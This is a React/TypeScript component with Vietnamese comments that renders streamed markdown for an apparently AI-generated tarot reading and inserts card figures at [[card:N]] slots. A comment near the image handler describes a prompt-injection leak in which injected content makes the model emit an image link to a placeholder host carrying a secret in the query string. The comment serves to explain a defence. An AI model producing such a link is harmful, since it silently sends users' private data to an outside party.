import { memo, type ReactNode } from 'react'
import { Markdown, type MarkdownComponents } from '@astryxdesign/core/Markdown'
import type { DrawnCard } from '@db'
import { CardFigure } from '../tarot/CardFigure'
import classes from './Markdown.module.css'

/** Mã [[card:N]] nằm riêng một dòng là chỗ đặt lá thứ N. */
const CARD_SLOT = /^[ \t]*\[\[card:(\d+)\]\][ \t]*$/gm
/** Mã chỉ gõ được nửa chừng trong lúc stream ("[[ca") thì ẩn đi cho tới khi đủ. */
const PARTIAL_SLOT = /\[\[c?a?r?d?:?\d*\]?$/

type Segment = { kind: 'text'; text: string } | { kind: 'card'; index: number }

/**
 * Cắt bài đọc thành từng đoạn markdown xen giữa các lá. Mỗi đoạn là một
 * <Markdown> riêng, lá là thẻ thật nằm giữa — không còn mẹo đổi mã thành ảnh
 * rồi thay ảnh, và thẻ lá (<figure>) không bao giờ nằm trong <p>.
 */
function split(text: string): Segment[] {
  const source = text.replace(PARTIAL_SLOT, '')
  const segments: Segment[] = []
  let last = 0
  for (const match of source.matchAll(CARD_SLOT)) {
    const before = source.slice(last, match.index)
    if (before.trim()) segments.push({ kind: 'text', text: before })
    segments.push({ kind: 'card', index: Number(match[1]) - 1 })
    last = match.index + match[0].length
  }
  const rest = source.slice(last)
  if (rest.trim()) segments.push({ kind: 'text', text: rest })
  return segments
}

/**
 * Hằng số cấp module, không tạo trong lúc render: mỗi object mới là một bộ
 * component mới và cây markdown bị dựng lại ở mỗi mẩu chữ.
 */
const COMPONENTS: MarkdownComponents = {
  // Ảnh ngoài là kênh rò dữ liệu: nội dung bị chèn lệnh vào model có thể viết
  // ![](https://ke-la/?d=<bí mật>) và trình duyệt tự gửi đi khi hiện ảnh —
  // không cần ai bấm gì. Chỉ giữ chữ thay thế.
  image: ({ alt }: { alt: string }) => (alt ? <span>{alt}</span> : null),
  // Link phải bấm mới đi, nhưng vẫn chỉ cho http(s) và không gửi referrer.
  link: ({ href, children }: { href: string; children: ReactNode }) =>
    /^https?:\/\//i.test(href) ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
}

function MarkdownTextImpl({
  text,
  cards,
  streaming,
}: {
  text: string
  cards: DrawnCard[] | null
  streaming: boolean
}) {
  const segments = split(text)
  return (
    <div className={classes.markdown}>
      {segments.map((segment, position) => {
        if (segment.kind === 'card') {
          const card = cards?.[segment.index]
          return card ? <CardFigure key={`card-${position}`} card={card} /> : null
        }
        return (
          <Markdown
            key={`text-${position}`}
            components={COMPONENTS}
            contentWidth="100%"
            headingLevelStart={2}
            // Chỉ đoạn cuối còn đang chảy; các đoạn trước đã đứng yên.
            isStreaming={streaming && position === segments.length - 1}
          >
            {segment.text}
          </Markdown>
        )
      })}
    </div>
  )
}

export const MarkdownText = memo(MarkdownTextImpl)
